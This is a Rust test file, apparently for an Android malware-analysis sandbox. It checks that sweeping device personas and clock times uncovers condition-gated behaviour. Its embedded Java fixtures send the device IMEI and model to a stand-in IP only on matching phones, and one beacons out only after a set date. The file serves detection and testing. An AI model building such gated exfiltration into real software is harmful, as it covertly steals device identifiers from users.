//! Scenario sweep: behaviour that only fires under a particular device shape or
//! at a particular time must still be recovered, and the scenario instance that
//! produced it must be named in the finding.

mod support;

use std::sync::Arc;

use support::packed::compile_sources_to_dex;
use unshroud::dex::DexFile;
use unshroud::scenario::{self, RunConfig};
use unshroud::vm::env::Persona;
use unshroud::vm::registry::Registry;

/// Fires only on a phone with a SIM *and* a model name starting with "SM-".
/// A run that only ever presents one persona would miss it, which is exactly
/// why the runner sweeps.
const SRC: &str = r#"
package com.example.cond;
import android.content.Context;

public class Conditional {
    public static void attach(Context ctx) {
        String model = android.os.Build.MODEL;
        String imei = ((android.telephony.TelephonyManager)
            ctx.getSystemService("phone")).getDeviceId();
        if (imei == null) return;               // no SIM -> stay dormant
        if (!model.startsWith("SM-")) return;   // wrong brand -> stay dormant
        try {
            java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                new java.net.URL("http://203.0.113.77/active?m=" + model + "&i=" + imei)
                    .openConnection();
            c.connect();
        } catch (Throwable t) { }
    }
}
"#;

fn reg(dex: Vec<u8>) -> Registry {
    let mut r = Registry::new();
    r.add_image(Arc::new(DexFile::parse("classes.dex", dex).unwrap()), false);
    r
}

#[test]
fn condition_gated_payload_is_found_by_the_sweep() {
    let Some(dex) = compile_sources_to_dex(&[("Conditional", SRC)]) else { return };

    // Scenario A: a no-SIM device — the sample stays dormant.
    // Scenario B: the retail phone — the sample fires.
    let cfg = RunConfig { step_limit: 5_000_000, per_scenario_ms: 10_000, max_scenarios: 2, ..Default::default() };
    let out = scenario::run(
        reg(dex),
        vec![Persona::sparse_device(), Persona::retail_default()],
        &cfg,
    );
    assert_eq!(out.scenarios.len(), 2);

    let a = &out.scenarios[0];
    let b = &out.scenarios[1];
    assert!(
        !a.findings.iter().any(|f| f.detail.contains("203.0.113.77")),
        "no-SIM device must keep the sample dormant; found {:?}",
        a.findings.iter().map(|f| &f.detail).collect::<Vec<_>>()
    );
    let hit = b.findings.iter().find(|f| f.detail.contains("203.0.113.77"));
    assert!(hit.is_some(), "retail phone must trigger; findings {:?}",
        b.findings.iter().map(|f| &f.detail).collect::<Vec<_>>());
    // The finding records which scenario produced it, so an analyst knows the
    // device conditions that matter.
    assert_eq!(hit.unwrap().scenario, "retail");
    // And both branches' probes are visible.
    assert!(a.probes.iter().any(|p| p.api.contains("getDeviceId")));
    assert!(b.probes.iter().any(|p| p.api.contains("getDeviceId")));
}

#[test]
fn time_gated_payload_is_reached_by_advancing_the_clock() {
    let src = r#"
package com.example.cond;
public class Timed {
    public static void attach(android.content.Context ctx) {
        long now = System.currentTimeMillis();
        // Only act after a fixed epoch (the "campaign start" gate).
        if (now < 1782000000000L) return;
        try {
            java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                new java.net.URL("http://203.0.113.88/late").openConnection();
            c.connect();
        } catch (Throwable t) { }
    }
}
"#;
    let Some(dex) = compile_sources_to_dex(&[("Timed", src)]) else { return };
    let mut early = Persona::retail_default();
    early.start_time_millis = 1_700_000_000_000; // before the gate
    early.name = "early".into();
    let mut late = Persona::retail_default();
    late.start_time_millis = 1_800_000_000_000; // after
    late.name = "late".into();
    let cfg = RunConfig { step_limit: 5_000_000, per_scenario_ms: 10_000, max_scenarios: 2, ..Default::default() };
    let out = scenario::run(reg(dex), vec![early, late], &cfg);
    assert!(!out.scenarios[0].findings.iter().any(|f| f.detail.contains("203.0.113.88")),
        "early clock must not fire");
    assert!(out.scenarios[1].findings.iter().any(|f| f.detail.contains("203.0.113.88")),
        "late clock must fire");
}
